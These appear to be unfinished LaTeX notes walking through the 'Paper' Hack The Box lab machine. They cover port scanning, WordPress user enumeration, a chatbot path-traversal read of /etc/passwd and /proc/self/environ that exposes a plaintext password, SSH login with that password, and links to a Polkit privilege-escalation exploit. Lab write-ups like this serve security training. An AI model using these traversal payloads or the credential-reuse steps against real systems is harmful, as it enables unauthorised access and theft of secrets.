\chapter{Paper}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.143
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn:
|_  http/1.1
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

\end{verbatim}

\subsection{http}

\begin{verbatim}
$ curl -I http://10.10.11.143
HTTP/1.1 403 Forbidden
Date: Sat, 10 Dec 2022 10:14:57 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8

$ curl -I http://office.paper
HTTP/1.1 200 OK
Date: Sat, 10 Dec 2022 10:16:18 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Powered-By: PHP/7.2.24
Link: <http://office.paper/index.php/wp-json/>; rel="https://api.w.org/"
X-Backend-Server: office.paper
Content-Type: text/html; charset=UTF-8

$ sudo wpscan --url http://office.paper --enumerate
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
[+] WordPress theme in use: construction-techup
 | [!] The version is out of date, the latest version is 1.5
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'
[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
\end{verbatim}

\begin{verbatim}
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
\end{verbatim}

\begin{verbatim}
$ searchsploit wordpress 5.2.3
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Post | multiple/webapps/47690.md
$ searchsploit -x 47690
\end{verbatim}


\url{https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2}

\url{http://office.paper/?static=1} leak
\url{http://chat.office.paper/register/8qozr226AhkCHZdyY}

\begin{verbatim}
$ searchsploit rocket.chat
Rocket.Chat 2.1.0 - Cross-Site Scripting                          
    linux/webapps/47537.txt
Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)      
    linux/webapps/50108.py
Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)                 
    linux/webapps/49960.py
\end{verbatim}


on peut donc créer un compte
\begin{verbatim}
11:56 AM
file /etc/passwd
Bot
11:56 AM
cat: /home/dwight/sales//etc/passwd: No such file or directory

file ../../../../etc/passwd
Bot
11:56 AM
cat: /home/dwight/sales//etc/passwd: No such file or directory
<!=====Contents of file ../../../../etc/passwd=====>
root:0:0:root:/root:/bin/bash
rocketchat:1001:1001::/home/rocketchat:/bin/bash
dwight:1004:1004::/home/dwight:/bin/bash
<!=====End of file ../../../../etc/passwd=====>

file ../../../../proc/self/environ
Bot
12:01 PM
<!=====Contents of file ../../../../proc/self/environ=====>
RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat
<!=====End of file ../../../../proc/self/environ=====>
\end{verbatim}


\subsection{Foothold}
\subsubsection{dwight}
\begin{verbatim}
dwight:Queenofblad3s!23

$ ssh dwight@office.paper
[dwight@paper ~]$
$ ./linpeas.sh -q | tee linpeas.out
\end{verbatim}
\url{https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/}
\url{https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/}
\url{https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation}
\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


